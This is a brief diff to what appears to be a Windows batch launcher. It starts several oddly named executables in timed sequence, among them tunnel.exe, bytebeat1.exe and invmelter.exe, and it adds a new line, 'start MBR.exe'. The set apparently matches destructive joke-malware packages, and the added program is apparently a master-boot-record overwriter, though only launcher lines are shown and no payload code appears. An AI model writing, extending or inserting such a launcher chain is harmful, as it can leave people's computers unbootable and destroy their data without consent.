@@ -18,6 +18,7 @@ start crazysound6.exe
 timeout 61
 start tunnel.exe
 timeout 31
+start MBR.exe
 start bytebeat1.exe
 timeout 81
 start invmelter.exe
